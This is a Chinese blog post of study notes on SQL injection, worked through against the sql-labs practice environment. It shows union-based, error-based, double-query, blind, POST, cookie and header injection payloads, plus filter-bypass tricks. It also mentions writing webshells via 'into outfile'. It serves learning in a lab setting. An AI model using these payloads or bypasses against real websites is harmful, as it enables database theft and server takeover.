---
layout: post
title: 不太全的sql注入笔记
date: 2020-10-06
tags: ["web"]
---

[toc]
以sql-labs为例。

## 注入基础

### 数据库相关

在mysql中，数据库information_schema存放的是数据库的所有信息。
其中：
- 表schemata存放的是数据库名的信息。
- 表tables存放的是数据库的库名和数据库的表名的映射。
- 表columns存放的是数据库的库名和数据库的表名以及表的行名的映射。

### 函数

<table>
<thead>
<tr>
  <th>函数名</th>
  <th>作用</th>
</tr>
</thead>
<tbody>
<tr>
  <td>group_concat()</td>
  <td>查询时，将查询的该项内容的全部内容连接在一起查询。</td>
</tr>
<tr>
  <td>concat_ws()</td>
  <td>至少三个参数，第一个参数为连接符，只有三个参数时，将第二三个参数通过第一个参数连接起来。</td>
</tr>
<tr>
  <td>concat()</td>
  <td>将两个参数连接起来</td>
</tr>
<tr>
  <td>order by</td>
  <td>按照第几列排序，假如不存在就会报错，常用于判断有几列</td>
</tr>
<tr>
  <td>extractvalue()</td>
  <td>两个参数，第一个参数为名称，第二个参数为xpath字符串，常将第二个参数写为sql语句来进行报错注入</td>
</tr>
<tr>
  <td>updatexml()</td>
  <td>三个参数，第一个参数为名称，第二个参数为xpath字符串，第三个参数为替换内容，常将第二个参数写为sql语句来进行报错注入</td>
</tr>
<tr>
  <td>mid()</td>
  <td>三个参数，第一个为字符串，第二个参数为开始位置，第三个参数为长度，可选，若不填写则返回剩余字符串。sql注入时常用于查询过长而分段查询</td>
</tr>
<tr>
  <td>substr()</td>
  <td>截取字符串，三个参数，第一个参数是字符串，第二个参数是起始位置，第三个参数是截取长度，需要注意的是mysql是从1开始的</td>
</tr>
<tr>
  <td>if()</td>
  <td>三个参数，第一个参数为表达式，若为真则执行第二个参数，若为假则执行第三个参数</td>
</tr>
<tr>
  <td>load_file()</td>
  <td>用于提取文件，参数为路径，返回文件的内容。找到注入点后即可在网站中读取文件。</td>
</tr>
<tr>
  <td>select...into outfile ()</td>
  <td>参数为物理路径，找到注入点后可以向服务器的该路径中写入文件，比如一句话木马等等。</td>
</tr>
<tr>
  <td>left()</td>
  <td>两个参数，第一个为字符串，第二个为截取的长度，从开头开始截取。</td>
</tr>
</tbody>
</table>

### url解码

<table>
<thead>
<tr>
  <th>编码后</th>
  <th>编码前</th>
</tr>
</thead>
<tbody>
<tr>
  <td>%23</td>
  <td>#</td>
</tr>
<tr>
  <td>%20</td>
  <td>空格</td>
</tr>
</tbody>
</table>

## 字符型注入

使用单引号'来进行分割
[![](http://ltfa1l.top/wp-content/uploads/2020/10/wp_editor_md_fdd3dbf49fdc12edc907fa2a8e8d900e.jpg)](wp_editor_md_fdd3dbf49fdc12edc907fa2a8e8d900e.jpg)

    http://127.0.0.1/Less-1/?id=1' and 0 union select 1,group_concat(schema_name),2 from information_schema.schemata %23

## 整型注入

没有单引号进行分割
[![](http://ltfa1l.top/wp-content/uploads/2020/10/wp_editor_md_14ac808d4f1041151dbae47a7b877521.jpg)](wp_editor_md_14ac808d4f1041151dbae47a7b877521.jpg)

    http://127.0.0.1/Less-2/?id=1 and 0 union select 1,group_concat(schema_name),3 from information_schema.schemata %23

## post注入

观察输入框
[![](http://ltfa1l.top/wp-content/uploads/2020/10/wp_editor_md_b3a9cd37e44bfa711143112b60d4ce76.jpg)](wp_editor_md_b3a9cd37e44bfa711143112b60d4ce76.jpg)
使用post方法
[![](http://ltfa1l.top/wp-content/uploads/2020/10/wp_editor_md_480a64a39c574a60395caf85ca6114be.jpg)](wp_editor_md_480a64a39c574a60395caf85ca6114be.jpg)

    uname=1' union select 1,group_concat(schema_name) from information_schema.schemata %23 && passwd=1

## 报错注入

利用函数的报错来进行查询注入。
此处分别用extractvalue()和updatexml()：
extractvalue():
[![](http://ltfa1l.top/wp-content/uploads/2020/10/wp_editor_md_8ac02504b3de8951648e03b6abee70c7.jpg)](wp_editor_md_8ac02504b3de8951648e03b6abee70c7.jpg)

    http://127.0.0.1/Less-5/?id=1' and 0 union select 1,2,extractvalue(1,(select mid(group_concat(schema_name),10) from information_schema.schemata))  %23

updatexml():
[![](http://ltfa1l.top/wp-content/uploads/2020/10/wp_editor_md_802d8127621854e92525279aecdb99ff.jpg)](wp_editor_md_802d8127621854e92525279aecdb99ff.jpg)

    http://127.0.0.1/Less-5/?id=1' and 0 union select 1,2, updatexml(1,(select mid(group_concat(schema_name),20) from information_schema.schemata),1)  %23

## 双注入

利用函数自身的bug来进行注入。
原理：在此处执行的时候，rand()会被执行两次，因此提示主键错误。原理较为复杂，可网上查询。
双注入即有两个select,**其中第一个select必须保证查询的数据库真的存在**，第二个select是我们需要查询的。
[![](http://ltfa1l.top/wp-content/uploads/2020/10/wp_editor_md_590350c3ba45cd4033e43c2a0372eee2.jpg)](wp_editor_md_590350c3ba45cd4033e43c2a0372eee2.jpg)

    http://127.0.0.1/Less-5/?id=1' union select 1,count(*),3 from information_schema.tables group by concat(floor(rand()*2),(select database())) %23

## 盲注

场景：没有任何报错提示。
盲注常见的有时间盲注，布尔盲注等等。
对于布尔盲注，需要有提示让我们知晓查询是否正确。
如图所示：
[![](http://ltfa1l.top/wp-content/uploads/2020/10/wp_editor_md_e263afbd1226bcf0fed98e301d811aed.jpg)](wp_editor_md_e263afbd1226bcf0fed98e301d811aed.jpg)
[![](http://ltfa1l.top/wp-content/uploads/2020/10/wp_editor_md_bf97a9597aa10dd11e8a54a35db78d9e.jpg)](wp_editor_md_bf97a9597aa10dd11e8a54a35db78d9e.jpg)
对于没有任何报错提示的注入，则考虑使用时间盲注。

### 布尔盲注

判断是否正确来进行盲注。
[![](http://ltfa1l.top/wp-content/uploads/2020/10/wp_editor_md_0d18497290fd5f56c4ec11a5a4873e70.jpg)](wp_editor_md_0d18497290fd5f56c4ec11a5a4873e70.jpg)
[![](http://ltfa1l.top/wp-content/uploads/2020/10/wp_editor_md_f2c8576aae19e933bff379502fea7050.jpg)](wp_editor_md_f2c8576aae19e933bff379502fea7050.jpg)
可以使用burp来进行爆破，也可以自行编写脚本。

### 时间盲注

通过修改if中的第一个参数的表达式，观察是否执行了sleep()来进行盲注。
[![](http://ltfa1l.top/wp-content/uploads/2020/10/wp_editor_md_5f8d9e3295afedc3194efb979ac4a665.jpg)](wp_editor_md_5f8d9e3295afedc3194efb979ac4a665.jpg)

## 其他注入位置

### cookie注入

比如sql-labs的第20题哈。
先登录成功，刷新的时候用burp抓包，再用repeater来进行更改包的内容，如图：
[![](http://ltfa1l.top/wp-content/uploads/2020/10/wp_editor_md_cd1b1dcdf7f18f1c305cd24958dae65f.jpg)](wp_editor_md_cd1b1dcdf7f18f1c305cd24958dae65f.jpg)

### header注入

奇怪的注入位置，比如referer,user-agent等等，方法同上类似，此处就不贴实例了。

## 绕过姿势

<table>
<thead>
<tr>
  <th>过滤字符</th>
  <th>可能的应对措施</th>
</tr>
</thead>
<tbody>
<tr>
  <td>注释符（%23，#）</td>
  <td>用and or构造闭合引号，报错注入</td>
</tr>
<tr>
  <td>and or</td>
  <td>换成&&,&#124;&#124;，aandnd等</td>
</tr>
<tr>
  <td>空格</td>
  <td>尝试%09 %0a %0c %0d %0b %a0 /**/</td>
</tr>
</tbody>
</table>